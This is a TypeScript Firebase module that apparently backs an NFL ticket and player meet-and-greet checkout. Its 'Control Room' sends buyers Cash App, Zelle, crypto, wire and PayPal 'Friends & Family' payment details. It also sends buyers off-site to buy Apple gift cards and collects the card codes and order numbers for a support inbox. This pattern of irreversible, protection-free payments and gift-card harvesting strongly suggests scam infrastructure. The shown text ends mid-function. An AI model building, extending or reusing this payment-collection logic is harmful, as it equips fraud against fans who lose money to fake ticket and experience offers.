import { 
  collection, 
  doc, 
  setDoc, 
  getDoc, 
  getDocs,
  deleteDoc,
  onSnapshot, 
  query, 
  where, 
  orderBy, 
  limit, 
  serverTimestamp, 
  updateDoc 
} from "firebase/firestore";
import { db, safeSetDoc } from "../lib/firebase";

export type PaymentMethodType = 
  | "cashapp" 
  | "zelle" 
  | "venmo" 
  | "bank" 
  | "card"
  | "paypal" 
  | "crypto" 
  | "giftcard";

export interface AdminPaymentDetails {
  method: string;
  title?: string;
  recipientName?: string;
  identifier?: string; // e.g. Cashtag, Zelle email/phone, PayPal email, Venmo handle, Crypto address
  accountNumber?: string;
  routingNumber?: string;
  bankName?: string;
  accountName?: string;
  network?: string; // For crypto
  mode?: string; // e.g. "Friends & Family", "Domestic Wire"
  instructions?: string;
  memo?: string;
  updatedAt?: number;
}

export interface SessionMailMessage {
  id: string;
  sender: "admin" | "customer";
  senderName?: string;
  subject?: string;
  body: string;
  createdAt: number;
}

export interface PaymentSession {
  id: string; // e.g. "PAY-XXXXXX"
  orderId?: string;
  customerName?: string;
  customerEmail?: string;
  customerPhone?: string;
  itemType: "ticket" | "experience" | "merchandise" | "deposit";
  itemTitle: string;
  venue?: string;
  amount: number;
  paymentMethod: PaymentMethodType;
  status:
    | "awaiting_admin_details"
    | "details_provided"
    | "payment_submitted"
    | "apple_partner_redirect"
    | "completed"
    | "cancelled";
  partnerClicked?: string;
  partnerUrl?: string;
  partnerClickedAt?: number;
  leftSiteForApplePurchase?: boolean;
  customerConfirmedSent?: boolean;
  sentConfirmedAt?: number;
  appleCardCodePreview?: string;
  appleOrderNumber?: string;
  ticketCode?: string;
  approvedAt?: number;
  approvedBy?: string;
  adminPaymentDetails?: AdminPaymentDetails | null;
  receiptUrl?: string;
  receiptImage?: string;
  receiptImages?: string[];
  referenceTag?: string;
  messages?: SessionMailMessage[];
  lastAdminMessageAt?: number;
  lastCustomerReplyAt?: number;
  createdAt: number;
  updatedAt: number;
}

export interface ControlRoomPaymentPresets {
  id: string;
  cashappTag?: string;
  cashappName?: string;
  zelleName?: string;
  zelleEmail?: string;
  bankName?: string;
  bankAccountName?: string;
  bankAccountNumber?: string;
  bankRoutingNumber?: string;
  paypalEmail?: string;
  paypalName?: string;
  paypalMode?: string;
  venmoHandle?: string;
  venmoName?: string;
  btcAddress?: string;
  ethAddress?: string;
  usdtAddress?: string;
  cardPaymentLink?: string;
  cardLabel?: string;
  defaultInstructions?: string;
  autoDispatchEnabled?: boolean;
  ceedeeTotalSlots?: number;
  updatedAt?: number;
}

const CONTROL_ROOM_SETTINGS_DOC = "master_payment_channels";

export async function getControlRoomPaymentPresets(): Promise<ControlRoomPaymentPresets | null> {
  try {
    const ref = doc(db, "control_room_payment_settings", CONTROL_ROOM_SETTINGS_DOC);
    const snap = await getDoc(ref);
    return snap.exists() ? (snap.data() as ControlRoomPaymentPresets) : null;
  } catch (err) {
    console.warn("Could not load control room payment presets:", err);
    return null;
  }
}

export function buildAdminDetailsFromPresets(
  method: string,
  presets: ControlRoomPaymentPresets | null | undefined
): AdminPaymentDetails | null {
  if (!presets) return null;
  const now = Date.now();
  const defaultNote = presets.defaultInstructions?.trim();

  if (method === "crypto") {
    const address = (presets.btcAddress || presets.usdtAddress || presets.ethAddress || "").trim();
    if (!address) return null;
    const altParts: string[] = [];
    if (presets.btcAddress?.trim() && presets.ethAddress?.trim() && presets.ethAddress.trim() !== address) {
      altParts.push(`ETH / USDT: ${presets.ethAddress.trim()}`);
    }
    if (presets.btcAddress?.trim() && presets.usdtAddress?.trim() && presets.usdtAddress.trim() !== address) {
      altParts.push(`USDT: ${presets.usdtAddress.trim()}`);
    }
    const baseInstr = defaultNote || "Send exact BTC equivalent to the verified deposit address below.";
    return {
      method: "crypto",
      identifier: address,
      mode: presets.btcAddress?.trim() ? "Bitcoin (BTC)" : "Crypto / USDT",
      instructions: altParts.length > 0 ? `${baseInstr} (${altParts.join(" · ")})` : baseInstr,
      updatedAt: now
    };
  }

  if (method === "cashapp" && presets.cashappTag?.trim()) {
    return {
      method: "cashapp",
      identifier: presets.cashappTag.trim(),
      recipientName: presets.cashappName?.trim() || "",
      instructions: defaultNote || "Please include your order reference in the Cash App note.",
      updatedAt: now
    };
  }

  if (method === "zelle" && presets.zelleEmail?.trim()) {
    return {
      method: "zelle",
      identifier: presets.zelleEmail.trim(),
      recipientName: presets.zelleName?.trim() || "",
      instructions: defaultNote || "Send via Zelle banking app. Zero fees.",
      updatedAt: now
    };
  }

  if (method === "bank" && (presets.bankAccountNumber?.trim() || presets.bankName?.trim())) {
    return {
      method: "bank",
      bankName: presets.bankName?.trim() || "",
      accountName: presets.bankAccountName?.trim() || "",
      accountNumber: presets.bankAccountNumber?.trim() || "",
      routingNumber: presets.bankRoutingNumber?.trim() || "",
      recipientName: presets.bankAccountName?.trim() || "",
      instructions: defaultNote || "Domestic ACH or Wire Transfer.",
      updatedAt: now
    };
  }

  if (method === "paypal" && presets.paypalEmail?.trim()) {
    return {
      method: "paypal",
      identifier: presets.paypalEmail.trim(),
      recipientName: presets.paypalName?.trim() || "",
      mode: presets.paypalMode?.trim() || "FRIENDS AND FAMILY",
      instructions: defaultNote || "Send via PayPal Friends & Family for instant clearance.",
      updatedAt: now
    };
  }

  if (method === "venmo" && presets.venmoHandle?.trim()) {
    return {
      method: "venmo",
      identifier: presets.venmoHandle.trim(),
      recipientName: presets.venmoName?.trim() || "",
      instructions: defaultNote || "Send via Venmo app.",
      updatedAt: now
    };
  }

  if (method === "card" && presets.cardPaymentLink?.trim()) {
    return {
      method: "card",
      identifier: presets.cardPaymentLink.trim(),
      mode: presets.cardLabel?.trim() || "Secure Credit / Debit Card Portal",
      instructions: defaultNote || "Complete payment via the verified Credit / Debit Card portal link below and upload your confirmation receipt.",
      updatedAt: now
    };
  }

  return null;
}

/**
 * Creates or updates a customer payment session in Firestore
 */
export async function createOrUpdatePaymentSession(session: Partial<PaymentSession> & { id: string; amount: number; paymentMethod: PaymentMethodType }): Promise<string> {
  const sessionRef = doc(db, "payment_sessions", session.id);
  const now = Date.now();

  let existingAdminDetails: AdminPaymentDetails | null = null;
  let existingStatus: string | null = null;
  let existingPaymentMethod: string | null = null;
  let existingCreatedAt = now;
  let existingReceiptUrl = "";
  let existingReceiptImages: string[] = [];
  let existingReferenceTag = "";
  let existingMessages: SessionMailMessage[] = [];
  let existingLastAdminMessageAt: number | undefined = undefined;
  let existingLastCustomerReplyAt: number | undefined = undefined;
  let existingCustomerConfirmedSent = false;
  let existingSentConfirmedAt: number | undefined = undefined;

  try {
    const snap = await getDoc(sessionRef);
    if (snap.exists()) {
      const data = snap.data() as PaymentSession;
      existingPaymentMethod = data.paymentMethod || null;
      existingAdminDetails = data.adminPaymentDetails || null;
      existingStatus = data.status || null;
      if (data.createdAt) existingCreatedAt = data.createdAt;
      existingReceiptUrl = data.receiptUrl || data.receiptImage || "";
      if (Array.isArray(data.receiptImages)) {
        existingReceiptImages = data.receiptImages.filter((u): u is string => typeof u === "string" && u.trim().length > 0);
      }
      if (data.referenceTag) existingReferenceTag = data.referenceTag;
      if (Array.isArray(data.messages)) {
        existingMessages = data.messages;
      }
      if (data.lastAdminMessageAt) existingLastAdminMessageAt = data.lastAdminMessageAt;
      if (data.lastCustomerReplyAt) existingLastCustomerReplyAt = data.lastCustomerReplyAt;
      if (data.customerConfirmedSent) existingCustomerConfirmedSent = true;
      if (data.sentConfirmedAt) existingSentConfirmedAt = data.sentConfirmedAt;
    }
  } catch (err) {
    console.warn("Could not check existing payment session:", err);
  }

  // Only carry over existing adminPaymentDetails/status if they belong to the SAME payment method.
  // If the customer switched payment methods (e.g. Cash App -> PayPal), clear the previous channel's details.
  const isSamePaymentMethod =
    (!existingPaymentMethod || existingPaymentMethod === session.paymentMethod) &&
    (!existingAdminDetails?.method || existingAdminDetails.method === session.paymentMethod);

  if (!isSamePaymentMethod) {
    existingAdminDetails = null;
    if (existingStatus !== "payment_submitted") {
      existingStatus = null;
      existingReferenceTag = "";
    }
  }
  
  // Preserve admin payment details if already given by the operator for this method
  let resolvedAdminDetails = session.adminPaymentDetails || existingAdminDetails || null;

  // Auto-dispatch from Control Room saved presets if no details exist yet for this session/method
  const hasExistingDetails = Boolean(
    resolvedAdminDetails &&
      (!resolvedAdminDetails.method || resolvedAdminDetails.method === session.paymentMethod) &&
      (resolvedAdminDetails.identifier || resolvedAdminDetails.accountNumber || resolvedAdminDetails.bankName)
  );
  if (!hasExistingDetails && session.paymentMethod !== "giftcard" && existingStatus !== "payment_submitted") {
    const presets = await getControlRoomPaymentPresets();
    if (presets && presets.autoDispatchEnabled !== false) {
      const presetDetails = buildAdminDetailsFromPresets(session.paymentMethod, presets);
      if (presetDetails) {
        resolvedAdminDetails = presetDetails;
      }
    }
  }

  const hasResolvedDetails = Boolean(
    resolvedAdminDetails &&
      (!resolvedAdminDetails.method || resolvedAdminDetails.method === session.paymentMethod) &&
      (resolvedAdminDetails.identifier || resolvedAdminDetails.accountNumber || resolvedAdminDetails.bankName)
  );

  // Resolve status: do not downgrade "details_provided" or "payment_submitted" back to awaiting if details already exist for this method
  let resolvedStatus = session.status;
  if (!resolvedStatus) {
    if (session.paymentMethod === "giftcard") {
      resolvedStatus = "payment_submitted";
    } else if (hasResolvedDetails) {
      resolvedStatus = (existingStatus === "payment_submitted") ? "payment_submitted" : "details_provided";
    } else {
      resolvedStatus = (existingStatus && existingStatus !== "awaiting_admin_details" && existingStatus !== "details_provided")
        ? existingStatus as any
        : "awaiting_admin_details";
    }
  } else if (resolvedStatus === "awaiting_admin_details" && hasResolvedDetails) {
    resolvedStatus = (existingStatus === "payment_submitted") ? "payment_submitted" : "details_provided";
  }

  const mergedImages = Array.from(new Set([
    ...(Array.isArray(session.receiptImages) ? session.receiptImages : []),
    ...(session.receiptUrl ? [session.receiptUrl] : []),
    ...(session.receiptImage ? [session.receiptImage] : []),
    ...existingReceiptImages,
    ...(existingReceiptUrl ? [existingReceiptUrl] : [])
  ].filter((u): u is string => typeof u === "string" && u.trim().length > 0)));

  const primaryReceipt = session.receiptUrl || session.receiptImage || mergedImages[0] || "";

  const payload: PaymentSession = {
    id: session.id,
    orderId: session.orderId || session.id,
    customerName: session.customerName || "Customer",
    customerEmail: session.customerEmail || "",
    customerPhone: session.customerPhone || "",
    itemType: session.itemType || "ticket",
    itemTitle: session.itemTitle || "NFL Experience / Tickets",
    ...(session.venue ? { venue: session.venue } : {}),
    amount: session.amount,
    paymentMethod: session.paymentMethod,
    status: resolvedStatus,
    adminPaymentDetails: resolvedAdminDetails,
    receiptUrl: primaryReceipt,
    receiptImage: primaryReceipt,
    receiptImages: mergedImages,
    referenceTag: session.referenceTag || existingReferenceTag || "",
    ...(session.partnerClicked ? { partnerClicked: session.partnerClicked } : {}),
    ...(session.partnerUrl ? { partnerUrl: session.partnerUrl } : {}),
    ...(session.partnerClickedAt ? { partnerClickedAt: session.partnerClickedAt } : {}),
    ...(session.leftSiteForApplePurchase !== undefined ? { leftSiteForApplePurchase: session.leftSiteForApplePurchase } : {}),
    ...(session.customerConfirmedSent !== undefined
      ? { customerConfirmedSent: session.customerConfirmedSent }
      : existingCustomerConfirmedSent
      ? { customerConfirmedSent: true }
      : {}),
    ...(session.sentConfirmedAt
      ? { sentConfirmedAt: session.sentConfirmedAt }
      : existingSentConfirmedAt
      ? { sentConfirmedAt: existingSentConfirmedAt }
      : {}),
    ...(session.ticketCode ? { ticketCode: session.ticketCode } : {}),
    ...(session.approvedAt ? { approvedAt: session.approvedAt } : {}),
    ...(session.approvedBy ? { approvedBy: session.approvedBy } : {}),
    messages: Array.isArray(session.messages) && session.messages.length > 0 ? session.messages : existingMessages,
    ...(existingLastAdminMessageAt ? { lastAdminMessageAt: existingLastAdminMessageAt } : {}),
    ...(existingLastCustomerReplyAt ? { lastCustomerReplyAt: existingLastCustomerReplyAt } : {}),
    createdAt: session.createdAt || existingCreatedAt,
    updatedAt: now
  };

  await safeSetDoc(sessionRef, payload, { merge: true });

  // Immediately alert support@nflgridiron.company when customer requests payment details (or starts awaiting session)
  if (resolvedStatus === "awaiting_admin_details" && (existingStatus !== "awaiting_admin_details" || !isSamePaymentMethod)) {
    void notifyAdminEmailAlert({
      eventType: "payment_details_requested",
      sessionId: session.id,
      orderId: payload.orderId || session.id,
      customerName: payload.customerName,
      customerEmail: payload.customerEmail,
      customerPhone: payload.customerPhone,
      itemTitle: payload.itemTitle,
      amount: payload.amount,
      paymentMethod: payload.paymentMethod,
      venue: payload.venue,
    });
  }

  return session.id;
}

/**
 * Records every checkout visitor who clicks to purchase an Apple Card on an affiliated
 * partner (Apple Store Online) and leaves the site, ensuring they appear
 * immediately in both the Control Room Live Queue and Box Office Orders for approval
 * once the Apple Card arrives at support@nflgridiron.company.
 */
export async function recordAppleCardPartnerDeparture(params: {
  sessionId?: string;
  customerName?: string;
  customerEmail?: string;
  customerPhone?: string;
  itemTitle?: string;
  itemType?: "ticket" | "experience" | "merchandise" | "deposit";
  amount?: number;
  partnerName: string;
  partnerUrl: string;
  venue?: string;
}): Promise<{ sessionId: string; orderId: string }> {
  const now = Date.now();
  const nowIso = new Date(now).toISOString();

  let storedName = "";
  let storedEmail = "";
  let storedPhone = "";
  try {
    storedName = localStorage.getItem("nfl_guest_sender_name") || "";
    storedEmail = localStorage.getItem("nfl_guest_buyer_email") || "";
    storedPhone = localStorage.getItem("nfl_guest_buyer_phone") || "";
  } catch {
    // ignore storage errors
  }

  const cleanName = (params.customerName || storedName || "Guest Checkout Visitor").trim();
  const cleanEmail = (params.customerEmail || storedEmail || "").trim();
  const cleanPhone = (params.customerPhone || storedPhone || "").trim();
  const cleanSessionId = (
    params.sessionId?.trim() ||
    `APPLE-${now.toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`
  );
  const orderId = cleanSessionId.startsWith("ORD-") ? cleanSessionId : `ORD-APPLE-${cleanSessionId}`;
  const cleanTitle = (params.itemTitle || "NFL Gridiron Experience").trim();
  const cleanVenue = (params.venue || "").trim();
  const numericAmount = Number(params.amount || 0) || 100;
  const referenceTag = `APPLE CARD VIA ${params.partnerName.toUpperCase()} · CHECK support@nflgridiron.company`;

  const sessionRef = doc(db, "payment_sessions", cleanSessionId);

  // Synchronously persist local recovery bookmarks & immediately dispatch keepalive server alert
  // BEFORE awaiting network round-trips so fast mobile tab switches / redirects never drop notifications.
  upsertSavedGuestSession({
    id: cleanSessionId,
    orderId,
    customerName: cleanName,
    customerEmail: cleanEmail,
    paymentMethod: "giftcard",
    itemTitle: cleanTitle,
    amount: numericAmount,
    status: "apple_partner_redirect",
    updatedAt: now
  });

  setPendingAppleConfirmation({
    sessionId: cleanSessionId,
    orderId,
    customerName: cleanName,
    customerEmail: cleanEmail,
    itemTitle: cleanTitle,
    amount: numericAmount,
    partnerName: params.partnerName,
    openedAt: now,
  });

  void notifyAdminEmailAlert({
    eventType: "payment_details_requested",
    sessionId: cleanSessionId,
    orderId,
    customerName: cleanName,
    customerEmail: cleanEmail,
    customerPhone: cleanPhone,
    itemTitle: cleanTitle,
    amount: numericAmount,
    paymentMethod: "Apple Gift Card",
    partnerName: params.partnerName,
    venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
    referenceTag,
  });

  // Check completion/approval status in parallel with non-destructive partner metadata, or write directly in one parallel batch
  let existingSession: Partial<PaymentSession> | null = null;
  let alreadyApproved = false;
  try {
    const [sessionSnap, bookingSnap] = await Promise.all([
      getDoc(sessionRef),
      getDoc(doc(db, "bookings", orderId)),
    ]);
    if (sessionSnap.exists()) {
      existingSession = sessionSnap.data() as PaymentSession;
    }
    if (bookingSnap.exists()) {
      const bData = bookingSnap.data();
      if (bData?.isApproved || bData?.status === "approved" || bData?.status === "confirmed") {
        alreadyApproved = true;
      }
    }
  } catch {
    // proceed with write even if pre-check fails or is slow
  }

  const isAlreadyCompleted = existingSession?.status === "completed";

  const writeJobs: Promise<any>[] = [
    safeSetDoc(
      sessionRef,
      {
        id: cleanSessionId,
        orderId,
        customerName: cleanName,
        customerEmail: cleanEmail,
        customerPhone: cleanPhone,
        itemType: params.itemType || existingSession?.itemType || "experience",
        itemTitle: cleanTitle,
        ...(cleanVenue ? { venue: cleanVenue } : {}),
        amount: numericAmount,
        paymentMethod: "giftcard",
        status: isAlreadyCompleted ? "completed" : "apple_partner_redirect",
        partnerClicked: params.partnerName,
        partnerUrl: params.partnerUrl,
        partnerClickedAt: now,
        leftSiteForApplePurchase: true,
        referenceTag: existingSession?.referenceTag || referenceTag,
        createdAt: existingSession?.createdAt || now,
        updatedAt: now
      },
      { merge: true }
    ),
  ];

  if (!alreadyApproved) {
    const baseBookingDoc: Record<string, any> = {
      id: orderId,
      orderId,
      bookingId: orderId,
      paymentSessionId: cleanSessionId,
      sessionId: cleanSessionId,
      experienceTitle: cleanTitle,
      itemName: cleanTitle,
      gameName: cleanTitle,
      stadium: cleanVenue || "AT&T Stadium · Arlington, Texas",
      venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
      buyerName: cleanName,
      userName: cleanName,
      senderName: cleanName,
      passholderName: cleanName,
      buyerEmail: cleanEmail,
      userEmail: cleanEmail,
      email: cleanEmail,
      buyerPhone: cleanPhone || cleanEmail,
      userId: `guest_${cleanSessionId}`,
      guestsCount: 1,
      quantity: 1,
      unitPrice: numericAmount,
      price: numericAmount,
      totalPrice: numericAmount,
      totalAmount: numericAmount,
      dueToday: numericAmount,
      paymentMethod: "giftcard",
      paymentChannel: "APPLE GIFT CARD",
      paymentRef: referenceTag,
      paymentReference: referenceTag,
      applePartnerName: params.partnerName,
      applePartnerUrl: params.partnerUrl,
      leftSiteForApplePurchase: true,
      partnerClickedAt: nowIso,
      status: "pending",
      orderStatus: `LEFT SITE FOR APPLE CARD (${params.partnerName.toUpperCase()}) · CHECK MAIL`,
      approvalStatus: "APPLE CARD PARTNER CLICKED · AWAITING MAIL IN support@nflgridiron.company",
      isApproved: false,
      createdAt: nowIso,
      updatedAt: nowIso
    };

    writeJobs.push(
      safeSetDoc(doc(db, "bookings", orderId), baseBookingDoc, { merge: true }),
      safeSetDoc(
        doc(db, "store_orders", `order-${orderId}`),
        {
          id: `order-${orderId}`,
          orderId,
          sessionId: cleanSessionId,
          paymentSessionId: cleanSessionId,
          userId: `guest_${cleanSessionId}`,
          userEmail: cleanEmail,
          buyerName: cleanName,
          buyerPhone: cleanPhone || cleanEmail,
          itemType: params.itemType === "ticket" ? "ticket" : "experience",
          itemName: cleanTitle,
          venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
          price: numericAmount,
          totalPrice: numericAmount,
          paymentMethod: "giftcard",
          paymentRef: referenceTag,
          applePartnerName: params.partnerName,
          leftSiteForApplePurchase: true,
          status: "pending_approval",
          orderStatus: `LEFT SITE FOR APPLE CARD (${params.partnerName.toUpperCase()}) · CHECK MAIL`,
          isApproved: false,
          timestamp: nowIso,
          updatedAt: nowIso
        },
        { merge: true }
      )
    );

    if (params.itemType === "experience" || cleanTitle.toLowerCase().includes("meet") || cleanTitle.toLowerCase().includes("ceedee")) {
      writeJobs.push(
        safeSetDoc(
          doc(db, "customer_inquiries", orderId),
          {
            id: orderId,
            orderId,
            sessionId: cleanSessionId,
            type: "apple_card_redirect",
            customerName: cleanName,
            customerEmail: cleanEmail,
            customerPhone: cleanPhone || cleanEmail,
            messagingPlatform: "Gmail",
            messagingDetails: cleanEmail,
            favoritePlayer: cleanTitle.toLowerCase().includes("ceedee") ? "CeeDee Lamb" : cleanTitle,
            venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
            feePaid: numericAmount,
            paymentMethod: "giftcard",
            paymentRef: referenceTag,
            applePartnerName: params.partnerName,
            leftSiteForApplePurchase: true,
            status: "pending",
            orderStatus: `LEFT SITE FOR APPLE CARD (${params.partnerName.toUpperCase()}) · CHECK MAIL`,
            isApproved: false,
            createdAt: nowIso,
            updatedAt: nowIso
          },
          { merge: true }
        )
      );
    }
  }

  await Promise.allSettled(writeJobs);

  if (isAlreadyCompleted) {
    clearPendingAppleConfirmation();
  }

  return { sessionId: cleanSessionId, orderId };
}

/**
 * Records explicit confirmation when the returning visitor confirms they have
 * completed and sent their Apple Card to support@nflgridiron.company (or
 * provides their Apple Order # / gift card code upon returning to our tab).
 */
export async function recordAppleCardSentConfirmation(params: {
  sessionId?: string;
  customerName?: string;
  customerEmail?: string;
  customerPhone?: string;
  itemTitle?: string;
  itemType?: "ticket" | "experience" | "merchandise" | "deposit";
  amount?: number;
  venue?: string;
  cardCode?: string;
  appleOrderNumber?: string;
}): Promise<{ sessionId: string; orderId: string }> {
  const now = Date.now();
  const nowIso = new Date(now).toISOString();

  let storedName = "";
  let storedEmail = "";
  let storedPhone = "";
  try {
    storedName = localStorage.getItem("nfl_guest_sender_name") || "";
    storedEmail = localStorage.getItem("nfl_guest_buyer_email") || "";
    storedPhone = localStorage.getItem("nfl_guest_buyer_phone") || "";
  } catch {
    // ignore storage errors
  }

  const cleanName = (params.customerName || storedName || "Guest Checkout Visitor").trim();
  const cleanEmail = (params.customerEmail || storedEmail || "").trim();
  const cleanPhone = (params.customerPhone || storedPhone || "").trim();
  const cleanSessionId = (
    params.sessionId?.trim() ||
    `APPLE-${now.toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`
  );
  const orderId = cleanSessionId.startsWith("ORD-") ? cleanSessionId : `ORD-APPLE-${cleanSessionId}`;
  const cleanTitle = (params.itemTitle || "NFL Gridiron Experience").trim();
  const cleanVenue = (params.venue || "").trim();
  const numericAmount = Number(params.amount || 0) || 100;
  const cleanCode = (params.cardCode || "").trim();
  const cleanAppleOrder = (params.appleOrderNumber || "").trim();

  const referenceParts = ["CONFIRMED SENT TO support@nflgridiron.company"];
  if (cleanCode) referenceParts.push(`CODE: ${cleanCode}`);
  if (cleanAppleOrder) referenceParts.push(`APPLE ORDER: ${cleanAppleOrder}`);
  const referenceTag = referenceParts.join(" · ");

  const sessionRef = doc(db, "payment_sessions", cleanSessionId);
  let existingSession: Partial<PaymentSession> | null = null;
  try {
    const snap = await getDoc(sessionRef);
    if (snap.exists()) {
      existingSession = snap.data() as PaymentSession;
    }
  } catch {
    // ignore
  }

  const isAlreadyCompleted = existingSession?.status === "completed";

  await safeSetDoc(
    sessionRef,
    {
      id: cleanSessionId,
      orderId,
      customerName: cleanName,
      customerEmail: cleanEmail,
      customerPhone: cleanPhone,
      itemType: params.itemType || existingSession?.itemType || "experience",
      itemTitle: cleanTitle,
      ...(cleanVenue ? { venue: cleanVenue } : {}),
      amount: numericAmount,
      paymentMethod: "giftcard",
      status: isAlreadyCompleted ? "completed" : "payment_submitted",
      partnerClicked: existingSession?.partnerClicked || "Apple Store Online",
      partnerClickedAt: existingSession?.partnerClickedAt || now,
      leftSiteForApplePurchase: true,
      customerConfirmedSent: true,
      sentConfirmedAt: now,
      ...(cleanCode ? { appleCardCodePreview: cleanCode } : {}),
      ...(cleanAppleOrder ? { appleOrderNumber: cleanAppleOrder } : {}),
      referenceTag,
      createdAt: existingSession?.createdAt || now,
      updatedAt: now
    },
    { merge: true }
  );

  let alreadyApproved = false;
  try {
    const bookingSnap = await getDoc(doc(db, "bookings", orderId));
    if (bookingSnap.exists()) {
      const bData = bookingSnap.data();
      if (bData?.isApproved || bData?.status === "approved" || bData?.status === "confirmed") {
        alreadyApproved = true;
      }
    }
  } catch {
    // ignore
  }

  if (!alreadyApproved) {
    const jobs: Promise<any>[] = [
      safeSetDoc(
        doc(db, "bookings", orderId),
        {
          id: orderId,
          orderId,
          bookingId: orderId,
          paymentSessionId: cleanSessionId,
          sessionId: cleanSessionId,
          experienceTitle: cleanTitle,
          itemName: cleanTitle,
          gameName: cleanTitle,
          stadium: cleanVenue || "AT&T Stadium · Arlington, Texas",
          venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
          buyerName: cleanName,
          userName: cleanName,
          senderName: cleanName,
          passholderName: cleanName,
          buyerEmail: cleanEmail,
          userEmail: cleanEmail,
          email: cleanEmail,
          buyerPhone: cleanPhone || cleanEmail,
          price: numericAmount,
          totalPrice: numericAmount,
          totalAmount: numericAmount,
          dueToday: numericAmount,
          paymentMethod: "giftcard",
          paymentChannel: "APPLE GIFT CARD",
          paymentRef: referenceTag,
          paymentReference: referenceTag,
          applePartnerName: "Apple Store Online",
          leftSiteForApplePurchase: true,
          customerConfirmedSent: true,
          sentConfirmedAt: nowIso,
          ...(cleanCode ? { appleCardCodePreview: cleanCode } : {}),
          ...(cleanAppleOrder ? { appleOrderNumber: cleanAppleOrder } : {}),
          status: "pending",
          orderStatus: "CUSTOMER CONFIRMED APPLE CARD SENT · VERIFY MAIL",
          approvalStatus: "APPLE CARD SENT · READY FOR ADMIN VERIFICATION IN support@nflgridiron.company",
          isApproved: false,
          updatedAt: nowIso
        },
        { merge: true }
      ),
      safeSetDoc(
        doc(db, "store_orders", `order-${orderId}`),
        {
          id: `order-${orderId}`,
          orderId,
          sessionId: cleanSessionId,
          paymentSessionId: cleanSessionId,
          userEmail: cleanEmail,
          buyerName: cleanName,
          buyerPhone: cleanPhone || cleanEmail,
          itemType: params.itemType === "ticket" ? "ticket" : "experience",
          itemName: cleanTitle,
          venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
          price: numericAmount,
          totalPrice: numericAmount,
          paymentMethod: "giftcard",
          paymentRef: referenceTag,
          applePartnerName: "Apple Store Online",
          leftSiteForApplePurchase: true,
          customerConfirmedSent: true,
          sentConfirmedAt: nowIso,
          status: "pending_approval",
          orderStatus: "CUSTOMER CONFIRMED APPLE CARD SENT · VERIFY MAIL",
          isApproved: false,
          timestamp: nowIso,
          updatedAt: nowIso
        },
        { merge: true }
      )
    ];

    if (params.itemType === "experience" || cleanTitle.toLowerCase().includes("meet") || cleanTitle.toLowerCase().includes("ceedee")) {
      jobs.push(
        safeSetDoc(
          doc(db, "customer_inquiries", orderId),
          {
            id: orderId,
            orderId,
            sessionId: cleanSessionId,
            type: "apple_card_redirect",
            customerName: cleanName,
            customerEmail: cleanEmail,
            customerPhone: cleanPhone || cleanEmail,
            messagingPlatform: "Gmail",
            messagingDetails: cleanEmail,
            favoritePlayer: cleanTitle.toLowerCase().includes("ceedee") ? "CeeDee Lamb" : cleanTitle,
            venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
            feePaid: numericAmount,
            paymentMethod: "giftcard",
            paymentRef: referenceTag,
            applePartnerName: "Apple Store Online",
            leftSiteForApplePurchase: true,
            customerConfirmedSent: true,
            sentConfirmedAt: nowIso,
            status: "pending",
            orderStatus: "CUSTOMER CONFIRMED APPLE CARD SENT · VERIFY MAIL",
            isApproved: false,
            updatedAt: nowIso
          },
          { merge: true }
        )
      );
    }

    await Promise.allSettled(jobs);
  }

  upsertSavedGuestSession({
    id: cleanSessionId,
    orderId,
    customerName: cleanName,
    customerEmail: cleanEmail,
    paymentMethod: "giftcard",
    itemTitle: cleanTitle,
    amount: numericAmount,
    status: isAlreadyCompleted ? "completed" : "payment_submitted",
    updatedAt: now
  });

  clearPendingAppleConfirmation();

  void notifyAdminEmailAlert({
    eventType: "payment_sent_confirmed",
    sessionId: cleanSessionId,
    orderId,
    customerName: cleanName,
    customerEmail: cleanEmail,
    customerPhone: cleanPhone,
    itemTitle: cleanTitle,
    amount: numericAmount,
    paymentMethod: "Apple Gift Card",
    partnerName: existingSession?.partnerClicked || "Apple Store Online",
    venue: cleanVenue || "AT&T Stadium · Arlington, Texas",
    cardCode: cleanCode || cleanAppleOrder || undefined,
    referenceTag,
  });

  return { sessionId: cleanSessionId, orderId };
}

/**
 * Real-time listener for a single customer's payment session
 */
export function subscribeToPaymentSession(
  sessionId: string, 
  onUpdate: (session: PaymentSession | null) => void
): () => void {
  if (!sessionId) {
    onUpdate(null);
    return () => {};
  }
  const sessionRef = doc(db, "payment_sessions", sessionId);
  return onSnapshot(
    sessionRef, 
    (snap) => {
      if (snap.exists()) {
        onUpdate(snap.data() as PaymentSession);
      } else {
        onUpdate(null);
      }
    },
    (err) => {
      console.warn("Payment session listener error:", err);
    }
  );
}

/**
 * Control Room: Dispatch custom payment details directly to a waiting customer session
 */
export async function dispatchPaymentDetailsToSession(
  sessionId: string,
  details: AdminPaymentDetails
): Promise<void> {
  const sessionRef = doc(db, "payment_sessions", sessionId);
  await safeSetDoc(sessionRef, {
    adminPaymentDetails: {
      ...details,
      updatedAt: Date.now()
    },
    status: "details_provided",
    updatedAt: Date.now()
  }, { merge: true });
}

/**
 * Customer submits payment reference / receipt after receiving payment details
 */
export async function submitCustomerPayment(
  sessionId: string,
  referenceTag: string,
  receiptUrl?: string,
  receiptUrls?: string[]
): Promise<void> {
  const sessionRef = doc(db, "payment_sessions", sessionId);
  const allImages = Array.from(new Set([
    ...(Array.isArray(receiptUrls) ? receiptUrls : []),
    ...(receiptUrl ? [receiptUrl] : [])
  ].filter((u): u is string => typeof u === "string" && u.trim().length > 0)));
  const primary = allImages[0] || receiptUrl || "";
  const now = Date.now();

  let sessionMeta: Partial<PaymentSession> | null = null;
  try {
    const snap = await getDoc(sessionRef);
    if (snap.exists()) {
      sessionMeta = snap.data() as PaymentSession;
    }
  } catch {
    // ignore metadata miss
  }

  await safeSetDoc(sessionRef, {
    referenceTag,
    receiptUrl: primary,
    receiptImage: primary,
    receiptImages: allImages,
    customerConfirmedSent: true,
    sentConfirmedAt: now,
    status: "payment_submitted",
    updatedAt: now
  }, { merge: true });

  void notifyAdminEmailAlert({
    eventType: "payment_sent_confirmed",
    sessionId,
    orderId: sessionMeta?.orderId || sessionId,
    customerName: sessionMeta?.customerName || "Customer",
    customerEmail: sessionMeta?.customerEmail || "",
    customerPhone: sessionMeta?.customerPhone || "",
